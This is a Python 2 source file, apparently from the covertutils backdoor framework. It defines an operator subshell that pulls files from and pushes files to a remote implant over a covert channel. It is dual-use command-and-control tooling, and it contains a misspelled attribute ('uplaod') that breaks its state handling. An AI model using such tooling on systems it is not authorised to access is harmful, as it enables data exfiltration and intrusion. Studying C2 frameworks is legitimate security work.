import cmd
import re

from covertutils.shells.subshells import SimpleSubShell


def _response_manager( message, instance ) :
	if message == "ERR" :
		if instance.download :
			print "Downloading '%s' failed" % instance.download
		elif instance.upload :
			print "Uploading '%s' failed" % instance.upload
		else :
			print "Unknown error"
			instance.upload= None
			instance.download= None
		return

	if message == "OK" :
		print "File uploaded succesfully!"
		instance.upload= None
		return

	elif message.startswith("D:") :
		content = message.split(':',1)[-1]
		f = open(instance.download, 'wb')
		f.write( content )
		f.close()
		print "File downloaded!"
		instance.download = None
	else :
		print "Not recognized response opcode"


class FileSubShell ( SimpleSubShell ) :


	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(['X']), prompt_templ = "=|{stream}]> ~ ") :
		# print ShellcodeSubShell
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		self.shellcode_buffer = ''

		self.download = None
		self.uplaod = None

		self.message_function = _response_manager


	def default( self, line ) :
		print "No such command"




	def do_download( self, line ) :
		# cmd, args, line = self.parseline(line)
		if not line :
			self.help_download()
			return

		args = line.split()
		remote = args[0]

		if len(args) == 1 :
			local = remote.split('/')[-1]
		else :
			local = args[1]

		self.download = local
		comm = 'D:' + remote
		SimpleSubShell.default( self, comm )



	def help_download( self ) :
		print "download <remote-file> [<location>]"
		print

	def help_upload( self ) :
		print "upload  <local-file> [<remote-location>]"
		print


	def do_upload( self, line ) :

		if not line :
			self.help_upload()
			return

		args = line.split()
		local = args[0]
		try :
			f = open(local,'rb')
			content = f.read()
			f.close()
		except :
			print "Could not open '%s' file" % local
			return
		if len(args) == 1 :
			remote = local.split('/')[-1]
		else :
			remote = args[1]
		self.upload = local
		comm = ('U:%s:' % remote) + content
		SimpleSubShell.default( self, comm )
